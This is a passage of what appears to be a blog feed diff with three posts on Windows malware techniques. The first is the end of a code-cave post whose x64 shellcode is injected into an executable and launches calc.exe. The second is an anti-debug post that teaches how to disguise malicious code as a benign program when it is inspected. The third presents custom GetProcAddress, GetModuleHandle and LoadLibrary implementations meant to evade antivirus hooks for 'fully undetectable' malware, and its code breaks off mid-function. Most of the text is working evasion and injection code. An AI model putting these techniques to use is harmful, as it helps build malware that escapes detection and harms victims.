+<span class="n">push</span> <span class="n">r8</span>
+<span class="n">push</span> <span class="n">r9</span>
+<span class="n">push</span> <span class="n">r10</span>
+<span class="n">push</span> <span class="n">r11</span>
+<span class="n">push</span> <span class="n">r12</span>
+<span class="n">push</span> <span class="n">r13</span>
+<span class="n">push</span> <span class="n">r14</span>
+<span class="n">push</span> <span class="n">r15</span> <span class="c1">// &lt;--- pushing ends here</span>
+<span class="n">xor</span> <span class="n">rdi</span><span class="p">,</span><span class="n">rdi</span> <span class="c1">// &lt;--- start of shellcode!</span>
+<span class="n">mul</span> <span class="n">rdi</span>
+<span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">gs</span><span class="o">:</span><span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mi">60</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rbx</span><span class="o">+</span><span class="mi">18</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rbx</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rbx</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">r8</span><span class="p">,</span><span class="n">rbx</span>
+<span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rbx</span><span class="o">+</span><span class="mi">3</span><span class="n">C</span><span class="p">]</span>
+<span class="n">add</span> <span class="n">rbx</span><span class="p">,</span><span class="n">r8</span>
+<span class="n">xor</span> <span class="n">rcx</span><span class="p">,</span><span class="n">rcx</span>
+<span class="n">add</span> <span class="n">cx</span><span class="p">,</span><span class="mi">88</span><span class="n">FF</span>
+<span class="n">shr</span> <span class="n">rcx</span><span class="p">,</span><span class="mi">8</span>
+<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rbx</span><span class="o">+</span><span class="n">rcx</span><span class="p">]</span>
+<span class="n">add</span> <span class="n">rdx</span><span class="p">,</span><span class="n">r8</span>
+<span class="n">xor</span> <span class="n">r10</span><span class="p">,</span><span class="n">r10</span>
+<span class="n">mov</span> <span class="n">r10d</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">1</span><span class="n">C</span><span class="p">]</span>
+<span class="n">add</span> <span class="n">r10</span><span class="p">,</span><span class="n">r8</span>
+<span class="n">xor</span> <span class="n">r11</span><span class="p">,</span><span class="n">r11</span>
+<span class="n">mov</span> <span class="n">r11d</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span>
+<span class="n">add</span> <span class="n">r11</span><span class="p">,</span><span class="n">r8</span>
+<span class="n">xor</span> <span class="n">r12</span><span class="p">,</span><span class="n">r12</span>
+<span class="n">mov</span> <span class="n">r12d</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">24</span><span class="p">]</span>
+<span class="n">add</span> <span class="n">r12</span><span class="p">,</span><span class="n">r8</span>
+<span class="n">jmp</span> <span class="n">cracked27</span> <span class="n">codecave</span><span class="p">.</span><span class="mi">7</span><span class="n">FF601E32494</span>
+<span class="n">pop</span> <span class="n">rbx</span>
+<span class="n">pop</span> <span class="n">rcx</span>
+<span class="n">xor</span> <span class="n">rax</span><span class="p">,</span><span class="n">rax</span>
+<span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span><span class="n">rsp</span>
+<span class="n">push</span> <span class="n">rcx</span>
+<span class="n">mov</span> <span class="n">rcx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">rsp</span><span class="p">]</span>
+<span class="n">xor</span> <span class="n">rdi</span><span class="p">,</span><span class="n">rdi</span>
+<span class="n">mov</span> <span class="n">edi</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">r11</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
+<span class="n">add</span> <span class="n">rdi</span><span class="p">,</span><span class="n">r8</span>
+<span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span><span class="n">rdx</span>
+<span class="n">repe</span> <span class="n">cmpsb</span> 
+<span class="n">je</span> <span class="n">cracked27</span> <span class="n">codecave</span><span class="p">.</span><span class="mi">7</span><span class="n">FF601E32485</span>
+<span class="n">inc</span> <span class="n">rax</span>
+<span class="n">jmp</span> <span class="n">cracked27</span> <span class="n">codecave</span><span class="p">.</span><span class="mi">7</span><span class="n">FF601E3246B</span>
+<span class="n">pop</span> <span class="n">rcx</span>
+<span class="n">mov</span> <span class="n">ax</span><span class="p">,</span><span class="n">word</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">r12</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">r10</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
+<span class="n">add</span> <span class="n">rax</span><span class="p">,</span><span class="n">r8</span>
+<span class="n">push</span> <span class="n">rbx</span>
+<span class="n">ret</span> 
+<span class="n">xor</span> <span class="n">rcx</span><span class="p">,</span><span class="n">rcx</span>
+<span class="n">add</span> <span class="n">cl</span><span class="p">,</span><span class="mi">7</span>
+<span class="n">mov</span> <span class="n">rax</span><span class="p">,</span><span class="mi">9</span><span class="n">C9A87BA9196A80F</span>
+<span class="n">not</span> <span class="n">rax</span>
+<span class="n">shr</span> <span class="n">rax</span><span class="p">,</span><span class="mi">8</span>
+<span class="n">push</span> <span class="n">rax</span>
+<span class="n">push</span> <span class="n">rcx</span>
+<span class="n">call</span> <span class="n">cracked27</span> <span class="n">codecave</span><span class="p">.</span><span class="mi">7</span><span class="n">FF601E32462</span>
+<span class="n">mov</span> <span class="n">r14</span><span class="p">,</span><span class="n">rax</span>
+<span class="n">xor</span> <span class="n">rcx</span><span class="p">,</span><span class="n">rcx</span>
+<span class="n">mul</span> <span class="n">rcx</span>
+<span class="n">push</span> <span class="n">rax</span>
+<span class="n">mov</span> <span class="n">rax</span><span class="p">,</span><span class="mi">9</span><span class="n">A879AD19C939E9C</span>
+<span class="n">not</span> <span class="n">rax</span>
+<span class="n">push</span> <span class="n">rax</span>
+<span class="n">mov</span> <span class="n">rcx</span><span class="p">,</span><span class="n">rsp</span>
+<span class="n">inc</span> <span class="n">rdx</span>
+<span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span><span class="mi">20</span>
+<span class="n">call</span> <span class="n">r14</span> <span class="c1">// &lt;--- end of shellcode!</span>
+<span class="n">pop</span> <span class="n">r15</span> <span class="c1">// &lt;--- popping all the general purpose registers from the stack (to restore register state)</span>
+<span class="n">pop</span> <span class="n">r14</span>
+<span class="n">pop</span> <span class="n">r13</span>
+<span class="n">pop</span> <span class="n">r12</span>
+<span class="n">pop</span> <span class="n">r10</span>
+<span class="n">pop</span> <span class="n">r9</span>
+<span class="n">pop</span> <span class="n">r8</span>
+<span class="n">pop</span> <span class="n">rbp</span>
+<span class="n">pop</span> <span class="n">rdi</span>
+<span class="n">pop</span> <span class="n">rsi</span>
+<span class="n">pop</span> <span class="n">rdx</span>
+<span class="n">pop</span> <span class="n">rcx</span>
+<span class="n">pop</span> <span class="n">rbx</span>
+<span class="n">mov</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">18</span><span class="p">],</span><span class="n">rbx</span>
+<span class="n">jmp</span> <span class="n">cracked27</span> <span class="n">codecave</span><span class="p">.</span><span class="mi">7</span><span class="n">FF601E3140D</span> <span class="c1">// &lt;--- Jumping back</span>
+</code></pre></div></div>
+
+<p>And we can see that the patched file opens <code class="language-plaintext highlighter-rouge">calc.exe</code> alongside its original payload:</p>
+
+<p><img src="/assets/images/injection/codecaves/calc.png" alt="x64 open calculator" /></p>]]></content><author><name>Alon Alush</name></author><category term="Injection" /><summary type="html"><![CDATA[Learn how to use code caves to inject custom code into a .exe file]]></summary></entry><entry><title type="html">AV Evasion: Anti-debug tricks</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/antidebug/" rel="alternate" type="text/html" title="AV Evasion: Anti-debug tricks" /><published>2025-04-18T00:00:00+00:00</published><updated>2025-04-18T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/antidebug</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/antidebug/"><![CDATA[<h1 id="reducing-av-detections">Reducing AV detections</h1>
+
+<p>One of the most common techniques malware authors use to create <strong>FUD</strong> (Fully Undetectable) malware is <strong>anti-debugging</strong>.</p>
+
+<p>Practically <em>every</em> anti-virus solution <strong>opens the target executable with <em>some</em> form of debugging or inspection enabled</strong>— Sometimes obvious, sometimes very stealthy.
+Here’s an example of function hooking in VirusTotal Jujubox:</p>
+
+<p><img src="/assets/images/evadingavs/anti-debug/jujubox.png" alt="VirusTotal Jujubox function hooking" /></p>
+
+<h1 id="what-you-have-to-know">What you have to know</h1>
+
+<p>Surprisingly: it’s often the <em>least</em> suspicious reactions (like a program immediately exiting without modifying anything), that trigger antivirus detection the most.</p>
+
+<p>This is why <strong>instead of simply terminating when a debugger is detected</strong>, it’s better to <strong>reroute execution and behave like an entirely <em>different</em> (but still “normal-looking”</strong>) program.</p>
+
+<p>For example: <strong>instead of exiting</strong> the program when a debugger is detected:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">IsDebuggerPresent</span><span class="p">())</span> <span class="p">{</span>
+    <span class="c1">// Debugger found</span>
+    <span class="n">ExitProcess</span><span class="p">();</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Do something like:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">IsDebuggerPresent</span><span class="p">())</span> <span class="p">{</span>
+    <span class="c1">// Debugger found</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="s">"Welcome to my Fibonacci number printer!"</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">num1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">num2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">upto</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Generate fibonacci numbers up to:"</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">upto</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">num1</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">num2</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">sum</span> <span class="o">&lt;</span> <span class="n">upto</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">sum</span> <span class="o">=</span> <span class="n">num1</span> <span class="o">+</span> <span class="n">num2</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sum</span><span class="p">);</span>
+        <span class="n">num1</span> <span class="o">=</span> <span class="n">num2</span><span class="p">;</span>
+        <span class="n">num2</span> <span class="o">=</span> <span class="n">sum</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// Nefarious code goes here!</span>
+</code></pre></div></div>
+
+<p><strong>route</strong> execution to an entirely different “legit” routine that acts as a random number generator, for example, and <em>only then</em> close the program.</p>
+
+<h1 id="anti-debugging-methods">Anti-debugging methods</h1>
+
+<p>A classic “one-liner” anti-debug trick I used in my crackme looks like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)(</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))</span> <span class="p">{</span>
+    <span class="c1">// Debugger detected</span>
+</code></pre></div></div>
+<p>The logic behind this line is simple.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">// &lt;-- gets the Process Environment Block address </span>
+</code></pre></div></div>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span> <span class="mi">2</span> <span class="c1">// &lt;-- 0x02 bytes offset from PEB contains the BeingDebugged field</span>
+</code></pre></div></div>
+<p>👉 <code class="language-plaintext highlighter-rouge">BeingDebugged</code> is a boolean (1 byte) that tells whether a debugger is attached to the process!</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">BeingDebugged == 1</code>, then you are being debugged (proabably by x64dbg)</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">BeingDebugged == 0</code>, then no debugger attached.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="c1">// A dereference that reads the BeingDebugged boolean</span>
+</code></pre></div></div>]]></content><author><name>Alon Alush</name></author><category term="AV-evasion" /><summary type="html"><![CDATA[Learn how malware evades anti-viruses (includes code examples)]]></summary></entry><entry><title type="html">AV Evasion: Custom WinAPI function implementations</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/evadingavs/" rel="alternate" type="text/html" title="AV Evasion: Custom WinAPI function implementations" /><published>2025-04-18T00:00:00+00:00</published><updated>2025-04-18T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/evadingavs</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/av-evasion/evadingavs/"><![CDATA[<h1 id="reducing-av-detections">Reducing AV detections</h1>
+
+<p>Malware authors work 24/7 to find breakthroughs that will allow them to create <strong>FUD</strong> (<strong>Fully Undetected</strong>) malware.</p>
+
+<p>There’s even a dedicated marketplace on YouTube and Telegram for people selling their so-called “<code class="language-plaintext highlighter-rouge">FUD crypters</code>”  that will claim to make <em>any</em> exe payload (including actual rat builds) <em>“have almost 0 detections on virustotal:”</em></p>
+
+<p><img src="/assets/images/evadingavs/customfunctions/videos.png" alt="Video results for searching &quot;FUD Crypter&quot; on Youtube" /></p>
+
+<p><img src="/assets/images/evadingavs/customfunctions/marketplace.png" alt="FUD crypter marketplace on Telegram" /></p>
+
+<p>And here’s an example of how one of these FUD crypters look like:</p>
+
+<p><img src="/assets/images/evadingavs/customfunctions/crypter.png" alt="Video results for searching &quot;FUD Crypter&quot; on Youtube" /></p>
+
+<h1 id="how-do-they-do-this">How do they do this?</h1>
+
+<p>It’s a combination of many different techniques. In this post, we’ll cover the most basic one:</p>
+
+<ul>
+  <li>Custom WinAPI function implementations</li>
+</ul>
+
+<p>Let’s start with custom WinAPI function implementations:</p>
+
+<p>As you may know, AVs look for programs that use “suspicious” WinAPI functions. We’re talking <code class="language-plaintext highlighter-rouge">GetModuleHandle</code>, <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, etc.</p>
+
+<p>Of course, these functions have legitimate uses, <strong>but they’re frequently used by malware authors</strong>.</p>
+
+<h1 id="the-solution">The solution</h1>
+
+<p>Instead of directly calling a CRT function like <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, malware authors will create their own “custom implementations” of these functions.</p>
+
+<p>For example, instead of calling <code class="language-plaintext highlighter-rouge">GetModuleHandleW</code> directly from the CRT (which is <em>hooked to death</em> by AV solutions):</p>
+
+<p><img src="/assets/images/evadingavs/customfunctions/crtfunction.png" alt="Direct WinAPI function usage" /></p>
+
+<p>They will create a custom function (<code class="language-plaintext highlighter-rouge">myGetModuleHandle</code>) that is meant to <strong>functionally replicate</strong> the original <code class="language-plaintext highlighter-rouge">GetModuleHandleW</code>, so that, instead of calling <code class="language-plaintext highlighter-rouge">GetModuleHandleW</code>, we will call <code class="language-plaintext highlighter-rouge">myGetModuleHandle</code> which looks a lot less suspicious, since it looks like a normal function in our code.</p>
+
+<p>Here’s an example of a custom <code class="language-plaintext highlighter-rouge">myGetModuleHandle</code> implementation that I used in my custom .exe packer:</p>
+
+<p><img src="/assets/images/evadingavs/customfunctions/customfunction.png" alt="Custom WinAPI function implementation" /></p>
+
+<p>As you can see, it manually walks over the linked list of modules (inside the PEB), copies the target module name (<code class="language-plaintext highlighter-rouge">ModuleName</code>) and the current module’s full path (<code class="language-plaintext highlighter-rouge">FullDllName</code>) into buffers, and checks if the current module name contains (or matches) the target name (case-insensitive partial match).</p>
+
+<p>If it matches, we return the base address (DllBase) of the loaded module:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">return</span> <span class="p">(</span><span class="n">HMODULE</span><span class="p">)</span><span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">;</span>
+</code></pre></div></div>
+<p>If it walks through all modules without a match:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return NULL;
+</code></pre></div></div>
+
+<p>We can then call this custom function in our code. So, instead of doing:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="s">L"ntdll.dll"</span><span class="p">)</span> <span class="c1">// ❌ &lt;-- Hooked!</span>
+</code></pre></div></div>
+<p>We will call our custom function:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">myGetModuleHandleW</span><span class="p">(</span><span class="s">L"ntdll.dll"</span><span class="p">)</span> <span class="c1">// ✅ &lt;-- Looks like a normal function!</span>
+</code></pre></div></div>
+<p>For my custom packer, I implemented these custom functions: <code class="language-plaintext highlighter-rouge">myVirtualAlloc</code>, <code class="language-plaintext highlighter-rouge">MyLoadLibrary</code>, <code class="language-plaintext highlighter-rouge">myGetModuleHandle</code>, <code class="language-plaintext highlighter-rouge">myGetProcAddress</code>.</p>
+
+<p>Below is the code for them:</p>
+
+<p>Custom <code class="language-plaintext highlighter-rouge">GetProcAddress</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FARPROC</span> <span class="nf">myGetProcAddress</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">LPCSTR</span> <span class="n">lpProcName</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">PIMAGE_DOS_HEADER</span> <span class="n">dosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">hModule</span><span class="p">;</span>
+	<span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS64</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">hModule</span> <span class="o">+</span> <span class="n">dosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+	<span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">exportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">hModule</span> <span class="o">+</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
+
+	<span class="n">DWORD</span><span class="o">*</span> <span class="n">addressOfFunctions</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">hModule</span> <span class="o">+</span> <span class="n">exportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
+	<span class="n">WORD</span><span class="o">*</span> <span class="n">addressOfNameOrdinals</span> <span class="o">=</span> <span class="p">(</span><span class="n">WORD</span><span class="o">*</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">hModule</span> <span class="o">+</span> <span class="n">exportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>
+	<span class="n">DWORD</span><span class="o">*</span> <span class="n">addressOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">hModule</span> <span class="o">+</span> <span class="n">exportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">exportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">lpProcName</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">hModule</span> <span class="o">+</span> <span class="n">addressOfNames</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="p">(</span><span class="n">FARPROC</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">hModule</span> <span class="o">+</span> <span class="n">addressOfFunctions</span><span class="p">[</span><span class="n">addressOfNameOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Custom <code class="language-plaintext highlighter-rouge">GetModuleHandle</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HMODULE</span> <span class="nf">myGetModuleHandle</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">ModuleName</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">PEB</span><span class="o">*</span> <span class="n">pPeb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PEB</span><span class="o">*</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+	<span class="n">PEB_LDR_DATA</span><span class="o">*</span> <span class="n">Ldr</span> <span class="o">=</span> <span class="n">pPeb</span><span class="o">-&gt;</span><span class="n">Ldr</span><span class="p">;</span>
+	<span class="n">LIST_ENTRY</span><span class="o">*</span> <span class="n">ModuleList</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Ldr</span><span class="o">-&gt;</span><span class="n">InMemoryOrderModuleList</span><span class="p">;</span>
+	<span class="n">LIST_ENTRY</span><span class="o">*</span> <span class="n">pStartListEntry</span> <span class="o">=</span> <span class="n">ModuleList</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
+	<span class="n">WCHAR</span> <span class="n">inputModule</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+	<span class="n">WCHAR</span> <span class="n">targetModule</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">LIST_ENTRY</span><span class="o">*</span> <span class="n">pListEntry</span> <span class="o">=</span> <span class="n">pStartListEntry</span><span class="p">;</span> <span class="n">pListEntry</span> <span class="o">!=</span> <span class="n">ModuleList</span><span class="p">;</span> <span class="n">pListEntry</span> <span class="o">=</span> <span class="n">pListEntry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">)</span> <span class="p">{</span>
+		
+		<span class="n">LDR_DATA_TABLE_ENTRY</span><span class="o">*</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">LDR_DATA_TABLE_ENTRY</span><span class="o">*</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">pListEntry</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LIST_ENTRY</span><span class="p">));</span>
+		<span class="n">wcscpy_s</span><span class="p">(</span><span class="n">targetModule</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">ModuleName</span><span class="p">);</span>
+		<span class="n">wcscpy_s</span><span class="p">(</span><span class="n">inputModule</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">FullDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">);</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="n">StrStrW</span><span class="p">(</span><span class="n">inputModule</span><span class="p">,</span> <span class="n">targetModule</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="p">(</span><span class="n">HMODULE</span><span class="p">)</span><span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Custom <code class="language-plaintext highlighter-rouge">LoadLibrary</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">pLdrLoadDll</span><span class="p">)</span> <span class="p">(</span>
+	<span class="n">PWCHAR</span> <span class="n">PathToFile</span><span class="p">,</span>
+	<span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
+	<span class="n">PUNICODE_STRING</span> <span class="n">ModuleFileName</span><span class="p">,</span>
+	<span class="n">PHANDLE</span> <span class="n">ModuleHandle</span>
+	<span class="p">);</span>
+<span class="n">HMODULE</span> <span class="nf">MyLoadLibrary</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpFileName</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">UNICODE_STRING</span> <span class="n">ustrModule</span><span class="p">;</span>
+	<span class="n">HANDLE</span> <span class="n">hModule</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="n">HMODULE</span> <span class="n">hNtdll</span> <span class="o">=</span> <span class="n">myGetModuleHandle</span><span class="p">((</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="s">L"ntdll.dll"</span><span class="p">);</span>
